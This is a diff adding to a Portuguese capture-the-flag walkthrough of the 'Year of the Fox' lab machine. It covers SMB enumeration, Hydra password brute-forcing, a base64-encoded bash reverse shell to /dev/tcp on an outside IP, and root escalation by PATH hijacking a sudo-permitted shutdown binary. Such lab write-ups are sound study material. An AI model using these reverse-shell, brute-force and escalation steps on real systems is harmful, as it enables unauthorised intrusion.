@@ -1,5 +1,8 @@
 # CTF_y3ar_0f_th3_f0x
 walkthrough yearofthefox
+
+*Capture the flag classificado como Difícil 
+
 ******************************************************************************************
 Vou começar enumerando os serviços no host com o Nmap.
 
@@ -7,6 +10,15 @@ Vou começar enumerando os serviços no host com o Nmap.
 
 ******************************************************************************************
 Usando o smbclient, existe um compartilhamento chamado yotf, porem precisamos da senha.
+
+ us3r  ~  smbclient -L //10.10.18.229
+Password for [WORKGROUP\us3r]:
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	yotf            Disk      Fox's Stuff -- keep out!
+	IPC$            IPC       IPC Service (year-of-the-fox server (Samba, Ubuntu))
+
 
 ![fox0 3](https://github.com/user-attachments/assets/253ebfc0-6749-41c1-83a5-285e52290969)
 
@@ -27,6 +39,11 @@ Vou tentar forçar a autenticação com hydra usando rascal como usuário
 
 ![fox0 6](https://github.com/user-attachments/assets/075d4faf-9659-4af9-b5e1-d13ebf1e3cc8)
 
+[80][http-get] host: 10.10.18.229   login: rascal   password: miroku
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-07-19 22:52:19
+ us3r  ~  ^C
+
 e encontrei o password
 
 ******************************************************************************************
@@ -46,6 +63,9 @@ Vou usar o repeater do BurpSuite para reenviar solicitações
 
 ******************************************************************************************
 tentar injetar um shell reverso em bash 
+
+echo -n "bash -i >& /dev/tcp/10.6.90.2/4444 0>&1" | base64
+
 ![fox1 2](https://github.com/user-attachments/assets/cb664284-5903-4e80-b3c6-d318b4478660)
 
 ******************************************************************************************
@@ -78,12 +98,29 @@ consegui a conexão SSH na porta 2222. Hora de um novo ataque brute force
 Temos a senha e vou fazer a conexão via ssh -p 2222
 ![fox2 1](https://github.com/user-attachments/assets/c8eda088-4fb2-4530-ad34-8d1a10831b9a)
 
+e temos a SEGUNDA FLAG
+******************************************************************************************
 
+verifiquei os priviçegios do fox com sudo -l e mostra que podemos executar o shutdown como root sem senha.
+Ao realizar eng reversa no codigo mostra que o executável de desligamento provavelmente foi escrito pelo autor do desafio. ele depende da função de desligamento
 
+void main() {
+    system("poweroff");
+    return;
+}
 
+Vamos explorar a vulnerabilidade encontrada fazendo uma cópia do bash que chamaremos em vez de desligar:
+cp /bin/bash poweroff
+sudo "PATH=/tmp:$PATH" /usr/sbin/shutdown
 
+![fox2 2](https://github.com/user-attachments/assets/7cb83a9f-f5ac-4492-abdd-781a18c5274e)
 
+******************************************************************************************
+Foi escalado pra user ROOT!!!
+a flag não estava disponivel no diretorio principal, mas sim oculta dentro do home/rascal.
+ai está a TERCEIRA FLAG!
 
+![fox2 3](https://github.com/user-attachments/assets/61f06ef5-0f81-4a7d-b212-be6d05c4c01a)
 
 
 
